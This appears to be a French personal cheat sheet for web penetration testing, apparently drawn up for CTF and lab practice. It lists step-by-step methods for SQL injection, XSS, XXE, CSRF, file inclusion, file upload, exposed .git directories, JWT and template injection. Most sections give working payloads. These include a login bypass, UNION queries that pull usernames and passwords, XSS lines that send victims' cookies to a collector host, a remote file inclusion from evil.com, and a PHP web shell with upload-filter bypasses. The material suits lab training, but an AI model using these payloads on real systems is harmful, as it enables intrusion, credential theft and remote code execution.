# Web


[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Portswigger labs](https://portswigger.net/web-security/all-labs)

[Root-Me labs - Web Serveur](https://www.root-me.org/fr/Challenges/Web-Serveur/)

[Root-Me labs - Web Client](https://www.root-me.org/fr/Challenges/Web-Client/)

[CyberChef](https://gchq.github.io/CyberChef/)



## Index

- [SQL Injection](#SQL-Injection)
- [XSS Injection](#XSS)
- [XXE Injection](#XXE)
- [CSRF Exploit](#CSRF)
- [File Inclusion](#File-Inclusion)
- [File Upload](#File-Upload)
- [Insecure source code management](#Insecure-source-code-management)
- [JSON WEB TOKEN](#JWT)
- [Template Injection](#Template-Injection)



## SQL Injection

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

[Portswigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Méthodologie pour un champ de connexion

- Vérifier qu'une injection SQL est possible
- Bypass la connexion avec un payload du type :
```powershell
' or 1=1--
```
- Ou se connecter avec un utilisateur spécifique avec un payload du type :
```powershell
username' --
```

### Méthodologie pour une requête affichée sur la page

- Vérifier qu'une injection SQL est possible
- Récupérer le nombre de colonnes retournées par la requête
```powershell
' order by X--
```
- Déterminer quels champs peuvent afficher le texte
```powershell
qzdqzdq' union select 'qdz',NULL,NULL--
```
- Récupérer la liste des tables avec la cheetsheet portswigger
- Ou récupérer directement une information d'une table connue ou standard (ex : users)
```powershell
qzdqzdq' union select username,password,NULL from users--
```

### Méthodologie pour une requête qui n'est pas affichée

- Faire une timebased SQL avec la cheetsheet portswigger ou la correction des labs :
[Time based Lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
[Time based avec récupération d'informations](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
```powershell
'||pg_sleep(10)--
```



## XSS

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

[Portswigger Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### Méthodologie pour un contenu affiché (Si il n'est pas afficher partir de l'étape 4)

- Vérifier que du XSS est possible
```powershell
a<b>Test</b>b
```
- Chercher les caractères interdits
- Essayer d'exécuter du script
```powershell
a<script>alert(0)</script>
```
```powershell
<a href="javascript:alert(1)">Test</a>
```
```powershell
<body onload=alert(1)>
```
```powershell
<img src=x onerror=alert(1)>
```
```powershell
<svg onload=alert(1)>
```
- Si on peut faire exécuter le XSS chez un autre utilisateur on peut récupérer ses cookies :
```powershell
<script>document.location='BEECEPTOR/'+document.cookie</script>
```
```powershell
<img src=x onerror=this.src='BEECEPTOR/'+document.cookie;>
```
```powershell
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
```
```powershell
localStorage.getItem('access_token')
```
- On peut également faire du CSRF pour obliger l'utilisateur à réaliser une action déterminée
[CSRF](#csrf)



## XXE

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

### Méthodologie pour afficher un fichier ou lire un lien

- Rajouter au début
```powershell
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
- Puis afficher le contenu avec
```powershell
&xxe;
```



## CSRF

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

[Générateur](https://security.love/CSRF-PoC-Genorator/)

### Méthodologie

- En fonction de la requête à exploiter utiliser le payload qui correspond
```powershell
<form action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net" />
</form>
<script>
  document.forms[0].submit();
</script>
```
```powershell
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```



## File Inclusion

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### Méthodologie

- Utiliser des retour en arrière pour accéder à des fichiers (cf: [Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal))
```powershell
../../../../../../../etc/passwd
```
- Utiliser des null bytes pour bypass les vérifications ou les ajouts de caractères
```powershell
../../../../../../../etc/passwd%00
```
- Utiliser le double encoding, l'utf encoding etc..
- Essayer une Remote File Inclusion en mettant un fichier extérieur hébergé avec [TMPFile](https://tmpfiles.org/)
```powershell
http://evil.com/shell.txt
```
- Utiliser un Wrapper pour afficher le contenu encrypté en base64
```powershell
php://filter/convert.base64-encode/resource=index.php
```



## File Upload

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

### Méthodologie

- Upload un fichier autorisé
- Récupérer le chemin d'accès au fichier
- Essayer de mettre un code php simple
```powershell
<?php echo 'test'; ?>
```
- En cas d'erreur essayer de changer l'extension :
```powershell
xxx.jpg.php
xxx.php.jpg
xxx.php%00.jpg
xxx.php........
xxx.php%20
xxx.%E2%80%AEphp.jpg  ==> xxx.gpj.php
```
- En cas d'erreur essayer de changer le MIME Type :
```powershell
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```
- En cas d'erreur essayer d'utiliser les Magic Bytes (cf: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files))
- Finalement on effectue une [RCI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) pour récupérer ce que l'on veut :
```powershell
<?php echo system($_GET['command']); ?>
```



## Insecure source code management

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management)

### Méthodologie

- Regarder si les fichiers suivants sont accessibles :
```powershell
.git/config
.git/HEAD
.git/logs/HEAD
```
- Utiliser la méthodologie PayloadsAllTheThings ou un outil donné



## JWT

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

### Méthodologie

- Analyser le token avec [jwt.io](https://jwt.io/)
- Essayer de changer le contenu sans modifier la signature
- Essayer de désactiver la signature
- Essayer de cracker la signature



## Template Injection

### Liens

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### Méthodologie

- Identifier le moteur en faisant exécuter une erreur
```powershell
<%=foobar%>
```
- Identifier le moteur en utilisant la cheatsheet
- Utiliser un exploit qui est compatible pour lire un fichier ou exécuter une [RCI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)



